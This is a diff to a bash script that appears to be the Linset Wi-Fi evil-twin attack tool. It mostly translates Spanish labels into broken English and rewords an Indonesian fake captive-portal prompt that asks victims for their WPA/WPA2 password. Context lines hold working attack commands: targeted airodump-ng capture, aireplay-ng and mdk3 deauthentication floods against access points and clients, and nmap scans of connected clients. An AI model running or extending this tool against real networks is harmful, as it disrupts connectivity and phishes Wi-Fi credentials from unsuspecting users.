@@ -445,8 +445,8 @@ DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
 DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 
 #Indonesia web interface messages
-DIALOG_WEB_INFO_IDN="ALASAN KEAMANAN, INPUT <b>"$Host_ENC"</b> AKSES KEY INTERNET"
-DIALOG_WEB_INPUT_IDN="Enter Wi-Fi WPA password:"
+DIALOG_WEB_INFO_IDN="UNTUK KEAMANAN Wi-Fi, INPUT <b>"$Host_ENC"</b> AKSES KEY INTERNET"
+DIALOG_WEB_INPUT_IDN="<b>Masukkan Wi-Fi (WPA/WPA2) Password</b>:"
 DIALOG_WEB_SUBMIT_IDN="Submit"
 DIALOG_WEB_ERROR_IDN="<b><font color=\"red\" size=\"3\">Error</font>:</b> Password yang di Masukkan <b>TIDAK</b> Benar!</b>"
 DIALOG_WEB_OK_IDN="Koneksi akan kembali beberapa saat."
@@ -486,7 +486,7 @@ fi
 # Comprueba la existencia de todas las dependencias
 function checkdependences {
 	
-	echo -ne "Aircrack-ng....."
+	echo -ne "aircrack-ng....."
 	if ! hash aircrack-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -495,7 +495,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Aireplay-ng....."
+	echo -ne "aireplay-ng....."
 	if ! hash aireplay-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -504,7 +504,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Airmon-ng......."
+	echo -ne "airmon-ng......."
 	if ! hash airmon-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -513,7 +513,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Airodump-ng....."
+	echo -ne "airodump-ng....."
 	if ! hash airodump-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -522,7 +522,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Awk............."
+	echo -ne "awk............."
 	if ! hash awk 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -531,7 +531,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Curl............"
+	echo -ne "curl............"
 	if ! hash curl 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -540,7 +540,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Dhcpd..........."
+	echo -ne "dhcpd..........."
 	if ! hash dhcpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor" (isc-dhcp-server)"
 		salir=1
@@ -549,7 +549,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Hostapd........."
+	echo -ne "hostapd........."
 	if ! hash hostapd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -558,7 +558,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Iwconfig........"
+	echo -ne "iwconfig........"
 	if ! hash iwconfig 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -567,7 +567,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Lighttpd........"
+	echo -ne "lighttpd........"
 	if ! hash lighttpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -576,7 +576,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Macchanger......"
+	echo -ne "macchanger......"
 	if ! hash macchanger 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -585,7 +585,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Mdk3............"
+	echo -ne "mdk3............"
 	if ! hash mdk3 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -594,7 +594,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Nmap............"
+	echo -ne "nmap............"
 	if ! [ -f /usr/bin/nmap ]; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -603,7 +603,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Php5-cgi........"
+	echo -ne "php5-cgi........"
 	if ! [ -f /usr/bin/php-cgi ]; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -612,7 +612,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Pyrit..........."
+	echo -ne "pyrit..........."
 	if ! hash pyrit 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -630,7 +630,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Unzip..........."
+	echo -ne "unzip..........."
 	if ! hash unzip 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -639,7 +639,7 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Xterm..........."
+	echo -ne "xterm..........."
 	if ! hash xterm 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
@@ -802,14 +802,14 @@ function setresolution {
 	}
 	function resF {
 		# Upper left window +0+0 (size*size+position+position)
-		TOPLEFT="-geometry 100x17+0+0" # capturando datos de victima ...  ( VENTANA AIRODUMP ATAUQE )
+		TOPLEFT="-geometry 100x17+0+0" # capture data a victim ...  ( VENTANA AIRODUMP ATAUQE )
 		# Upper right window -0+0
 		TOPRIGHT="-geometry 90x27-0+0" # desautenticando
 		# Bottom left window +0-0
 		BOTTOMLEFT="-geometry 100x30+0-0" # aireplay , CHOPCHOP , FRAGMENTACION... ( VENTANA BAJO CAPTURAS DE AIRODUMP )
 		# Bottom right window -0-0
 		BOTTOMRIGHT="-geometry 90x20-0-0" # ASOCIANDO CON... ( VENTANA ROJA )
-		TOPLEFTBIG="-geometry  100x70+0+0" # escaneando objetivos ... ( ESCANEO INICIAL )
+		TOPLEFTBIG="-geometry  100x70+0+0" # Scaning object ... ( ESCANEO INICIAL )
 		TOPRIGHTBIG="-geometry 90x27-0+0"  # AIRCRACK ... ( BUSQUEDA DE KEYS ) 
 }
 
@@ -964,14 +964,14 @@ function Scanchan {
 	conditional_clear
 	
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Escaneando Objetivos en el canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
+	xterm $HOLD -title "Scaning object s Channel -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
 }
 
 # Escanea toda la red
 function Scan {
 	
 	conditional_clear
-	xterm $HOLD -title "Escaneando Objetivos ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
+	xterm $HOLD -title "Scaning Object ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
 }
 
 # Elige una red de todas las escaneadas
@@ -1142,7 +1142,7 @@ function handshakelocation {
 					echo "Puede probar suerte con aircrack-ng, ya que es mas permisivo..."
 					echo "Desea probar con aircrack-ng en vez de pyrit para comprobar el handshake? [ ENTER = NO ]"
 					echo
-					echo -n "Respuesta: "
+					echo -n "Request: "
 					echo -ne "$rojo"
 					read handshakeloc_aircrack
 					echo -ne "$rescolor"
@@ -1332,7 +1332,7 @@ function capture {
 	if ! ps -A | grep -q airodump-ng; then
 		
 		rm -rf $DUMP_PATH/$Host_MAC*
-		xterm $HOLD -title "Capturando datos en el canal --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
+		xterm $HOLD -title "Capture Data a Channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
 	fi
 }
 
@@ -1375,7 +1375,7 @@ function checkhandshake {
 
 ############################################# < ATAQUE > ############################################
 
-# Selecciona interfaz web que se va a usar
+# Selection web interface user language
 function webinterface {
 	
 	while true; do
@@ -1745,7 +1745,7 @@ function attack {
 	killall aireplay-ng &> $linset_output_device
 	killall mdk3 &> $linset_output_device
 	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthentication All mdk3 $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	
 	xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
 	conditional_clear
@@ -1847,16 +1847,16 @@ function handshakecheck {
 	echo "readarray -t CLIENTESDHCP < <(nmap -sP -oG - $RANG_IP.100-110 2>&1 | grep Host )
 	
 	echo
-	echo -e \"  PUNTO DE ACCESO:\"
-	echo -e \"    Nombre..........: "$blanco"$Host_SSID"$rescolor"\"
+	echo -e \"  POINT ACCESS :\"
+	echo -e \"    Name............: "$blanco"$Host_SSID"$rescolor"\"
 	echo -e \"    MAC.............: "$amarillo"$Host_MAC"$rescolor"\"
-	echo -e \"    Canal...........: "$blanco"$Host_CHAN"$rescolor"\"
+	echo -e \"    Channel.........: "$blanco"$Host_CHAN"$rescolor"\"
 	echo -e \"    Fabricante......: "$verde"$Host_MAC_MODEL"$rescolor"\"
-	echo -e \"    Tiempo activo...: "$gris"\$ih\$horas:\$im\$minutos:\$is\$segundos"$rescolor"\"
+	echo -e \"    Time active.....: "$gris"\$ih\$horas:\$im\$minutos:\$is\$segundos"$rescolor"\"
 	echo -e \"    Intentos........: "$rojo"\$(cat $DUMP_PATH/hit.txt)"$rescolor"\"
-	echo -e \"    Clientes........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | sort| uniq | wc -l)"$rescolor"\"
+	echo -e \"    Client..........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | sort| uniq | wc -l)"$rescolor"\"
 	echo
-	echo -e \"  CLIENTES ACTIVOS:\"
+	echo -e \"  CLIENT ACTIVE:\"
 	
 	x=0
 	for cliente in \"\${CLIENTESDHCP[@]}\"; do
@@ -1947,13 +1947,13 @@ function handshakecheck {
 # Deauth a todos
 function deauthall {
 	
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando a todos de $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthentication All $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 function deauthmdk3 {
 	
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthentication All mdk3 $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
 	sleep 15
 	kill $mdk3PID &>$linset_output_device
@@ -1963,7 +1963,7 @@ function deauthmdk3 {
 function deauthesp {
 	
 	sleep 2
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthentication a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 # Cierra todos los procesos
